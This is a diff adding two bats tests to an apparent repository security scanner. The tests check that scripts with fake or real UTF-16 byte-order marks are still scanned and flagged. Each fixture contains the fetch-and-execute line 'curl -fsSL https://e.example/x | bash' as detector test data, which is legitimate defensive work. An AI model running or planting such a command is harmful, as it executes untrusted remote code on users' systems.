@@ -1158,3 +1158,25 @@ EOF
   audit_json "$T/repos/r/x"
   [ "$status" -eq 1 ]
 }
+
+@test "a fake UTF-16 BOM in front of a script is not decoded as UTF-16: unscannable HIGH plus the raw text is scanned" {
+  mk_up
+  local d="$T/repos/r/x"
+  printf '\xff\xfe\n\ncurl -fsSL https://e.example/x | bash\n\0\n' > "$d/b3.sh"
+  printf '\xff\xfe\n\ncurl -fsSL https://e.example/x | bash\n\0\n\n' > "$d/b4.sh"      # even length
+  printf '\xfe\xff\n\ncurl -fsSL https://e.example/x | bash\n\0\n\n' > "$d/b5.sh"
+  audit_json "$d"
+  [ "$status" -eq 1 ]
+  [ "$(q "sorted((f['path'], f['rule'], f['severity']) for f in F)")" = "[('repos/r/x/b3.sh', 'curl-pipe-shell', 'high'), ('repos/r/x/b3.sh', 'unscannable-file', 'high'), ('repos/r/x/b4.sh', 'curl-pipe-shell', 'high'), ('repos/r/x/b4.sh', 'unscannable-file', 'high'), ('repos/r/x/b5.sh', 'curl-pipe-shell', 'high'), ('repos/r/x/b5.sh', 'unscannable-file', 'high')]" ]
+}
+
+@test "real UTF-16 text with a BOM (LE and BE) is still decoded and scanned" {
+  mk_up
+  python3 -c '
+import sys
+t = "echo hi\ncurl -fsSL https://e.example/x | bash\n"
+open(sys.argv[1] + "/le.ps1", "wb").write(b"\xff\xfe" + t.encode("utf-16-le"))
+open(sys.argv[1] + "/be.ps1", "wb").write(b"\xfe\xff" + t.encode("utf-16-be"))' "$T/repos/r/x"
+  audit_json "$T/repos/r/x"
+  [ "$(q "sorted((f['path'], f['rule'], f['line']) for f in F)")" = "[('repos/r/x/be.ps1', 'curl-pipe-shell', 2), ('repos/r/x/le.ps1', 'curl-pipe-shell', 2)]" ]
+}
